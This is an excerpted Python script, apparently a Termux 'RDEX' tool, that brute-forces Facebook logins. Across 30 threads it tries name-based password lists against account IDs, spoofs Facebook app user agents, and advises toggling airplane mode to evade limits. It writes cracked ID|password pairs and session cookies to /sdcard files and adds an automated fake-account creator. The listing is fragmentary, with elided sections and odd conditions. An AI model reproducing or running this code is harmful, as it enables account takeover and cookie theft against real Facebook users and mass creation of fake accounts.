...
try:
    ...
    os.system('python RDEX.py')
try:
    os.mkdir('/sdcard/RDEX')
except:pass
import os
import sys
import time
...
logo=(f"""\033[1;37m
 \033[1;32m8888888b.  8888888b.  8888888888 Y88b   d88P      
 \033[1;37m888   Y88b 888  "Y88b 888         Y88b d88P       
 \033[1;37m888    888 888    888 888          Y88o88P        
 \033[1;32m888   d88P 888    888 8888888       Y888P         
 \033[1;32m8888888P"  888    888 888           d888b         
 \033[1;37m888 T88b   888    888 888          d88888b        
 \033[1;37m888  T88b  888  .d88P 888         d88P Y88b       
 \033[1;32m888   T88b 8888888P"  8888888888 d88P   Y88
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mAuthor  : KOUSSSI
 ...
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mCLONING IDS SAVED IN RDEX FOLDER
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""")
def linex():
    print('\033[1;32m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
...
def menu():
            clear()
        #    linex()
            print('   \33[37;42m\t Welcome RDEX xd RDEX Tool\33[0;m');linex()
            ...
            if xd in ['1','01']:
                ...
                with tred(max_workers=30) as crack_submit:
                    ...
                    print(" \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mRDEX Crack Has Been Running \n \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mUse Airplane mode after 2 minutes ")
                    linex()
                    for user in fo:
...
def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write('\r\r\033[1;37m [RDEX-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+"Dalvik/2.1.0 (Linux; U; Android 11; moto g power (2021) Build/RZBS31.Q2-143-27-7) [FBAN/Orca-Android;FBAV/352.0.0.9.116;FBPN/com.facebook.orca;FBLC/en_US;FBBV/356687955;FBCR/cricket;FBMF/motorola;FBBD/motorola;FBDV/moto g power (2021);FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1488};FB_FW/1;]"+"Dalvik/2.1.0 (Linux; U; Android 10; Lenovo TB-X505F Build/QKQ1.191224.003) [FBAN/Orca-Android;FBAV/352.0.0.9.116;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/356687941;FBCR/null;FBMF/LENOVO;FBBD/Lenovo;FBDV/Lenovo TB-X505F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=1.0,width=1280,height=784};FB_FW/1;]"+"Dalvik/2.1.0 (Linux; U; Android 10; SM-A115M Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/319.0.0.22.170;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/301916794;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A115M;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1411};FB_FW/1;]"
                li = ['28','29','210']
                ...
                q = json.loads(po)
                if 'session_key' in q:
                    print('\r\r\033[1;32m [RDEX-OK] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/RDEX/RDEX-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [RDEX-CP] '+ids+' | '+pas+'\033[1;97m')
                        open('/sdcard/RDEX/RDEX-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open('/sdcard/RDEX/RDEX-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [RDEX-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
    ...
    'viewport-width': '980',}
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/RDEX/RDEX-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/RDEX/RDEX-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [RDEX-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
    ...
    'viewport-width': '980',}
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [RDEX-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                    
                                        open('/sdcard/RDEX/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/RDEX/rndm-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [RDEX-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RDEX/RDEX-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def Create():
    ...
    def strt():
       try:
           ...
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [RDEX-CREATE] OK:%s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           ...
           if "9":
              ...
              if requests=="chk":
                ...
                pass
                 ...
                 print("\r\r\033[1;32m [RDEX-OK] "+uid+'|'+pas+'|'+coki)
                 linex()
                 ok+=1
                 open("/sdcard/RDEX/AUTO-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
